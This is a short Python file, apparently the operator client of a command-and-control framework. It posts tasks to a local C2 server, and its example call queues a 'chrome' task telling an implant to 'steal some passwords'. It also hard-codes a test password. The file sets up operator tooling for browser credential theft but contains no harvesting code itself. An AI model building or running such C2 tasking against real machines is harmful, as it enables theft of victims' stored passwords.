### the backend of the client ###
### just in case client is not merely a frontend for the server ###
### TODO: think about whether we still need front end ###

import requests 

### configs ###
password = "ch0nky" # a temperary password to test the server
localhost = "http://127.0.0.1:5000"
client_register_uri = "/client/login"
task_create_uri = "/tasks/create"

#-------------------------------------------------

### authentication ###


#-------------------------------------------------


### task creation ###

def create_task(command_type, cmd, agent_id):
    """
        create a task on the C2 server
    """
    print("[+] Creating task on C2 server...")
    r = requests.post(localhost + task_create_uri, json={"command_type": command_type, "cmd": cmd, "agent_id": agent_id})
    if r.status_code == 200:
        resp = r.json()
        if resp["status"] == "ok":
            print("[+] Task created on C2 server")
            return True
        else:
            print("[-] Task creation failed on C2 server", resp["status"])
            return False
    else:
        print("[-] http request failed", r.status_code)
        return False

#-------------------------------------------------

if __name__ == "__main__":
    create_task(command_type="chrome", cmd="steal some passwords for me", agent_id="cd4f442d8d7c77bc63403554efabc7dd")